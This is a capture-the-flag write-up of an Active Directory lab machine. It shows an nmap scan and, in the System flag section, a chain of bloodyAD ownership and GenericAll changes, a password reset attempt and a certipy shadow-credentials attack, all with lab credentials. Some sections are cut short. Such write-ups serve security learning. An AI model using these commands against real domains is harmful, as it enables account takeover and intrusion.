## Tools learned
This was my very first AD (and Windows, in general) machine. These are the tools I employed to pwn this machine:

* Bloodhound
* impacket-smbclient
* impacket-mssqlclient
* Netexec
* bloodyAD
* evil-winrm
* certipy
* Get-UserSPN
## User flag

We start the recon and enumeration of the machine with an Nmap scan:
`nmap -p- 10.10.11.51 -Pn`

```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-05-30 00:04 UTC
Nmap scan report for sequel.htb (10.10.11.51)
Host is up (0.096s latency).
Not shown: 65514 filtered tcp ports (no-response)
PORT      STATE SERVICE
53/tcp    open  domain
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
1433/tcp  open  ms-sql-s
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
47001/tcp open  winrm
[...]
```
We can deduce from this scan's results that this machine is an Active Directory Domain Controller, because it exposes the signature services of a typical DC, `ldap`, `microsoft-ds`, `kpasswd5` those are evidence enough. In any case, this is something we already knew from the get-go, as this challenge is of assumed breach modality.

We tried running `netexec` with the provided credentials, to enumerate the directory's services and permissions of our compromised user.


## System flag

Change the object's owner:

`bloodyAD --host 10.10.11.51 -d 'sequel.htb' -u ryan -p WqSZAF6CysDQbGb3 set owner ca_svc ryan

Output: 

`[+] Old owner S-1-5-21-548670397-972687484-3496335370-512 is now replaced by ryan on ca_svc`

Then we gave our controlled user full permissions over the `ca_svc`:

`bloodyAD --host 10.10.11.51 -d sequel.htb -u ryan -p WqSZAF6CysDQbGb3 add genericAll ca_svc ryan`

`[+] ryan has now GenericAll on ca_svc`

In order to gain access to this user, we first tried to force a password change:

`bloodyAD --host 10.10.11.51 -d sequel.htb -u ryan -p WqSZAF6CysDQbGb3 set password ca_svc password123!

That didn't work. We then tried to Kerberoast the account and crack the TGS's hash to get the password, and that didn't work either. Finally, we launched a shadow credential attack:

`certipy shadow -account ca_svc -target-ip 10.10.11.51 -u ryan@sequel.htb -p WqSZAF6CysDQbGb3 auto`

This attack was successful, and we gained access to the `ca_svc` account.

## The `ca_svc` domain user